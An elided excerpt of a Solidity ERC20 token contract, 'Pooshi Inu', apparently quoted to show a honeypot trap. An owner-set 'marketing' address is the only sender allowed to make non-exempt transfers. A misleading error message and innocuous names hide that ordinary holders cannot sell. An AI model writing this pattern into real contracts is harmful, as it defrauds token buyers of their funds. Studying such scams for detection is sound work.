...
contract POOSHIINU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Pooshi Inu";
    string private _symbol = "POOSHI";
    ...
    address currMarketing = 0x000000000000000000000000000000000000dEaD;
    ...
    function setMarketingExempts(address _current_marketing) public onlyOwner {
        currMarketing = _current_marketing;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                ...
                if (!exemptsfromFees) {
                    require(sender == currMarketing, "Allow transfers without fees to the dead address only"); 
                }
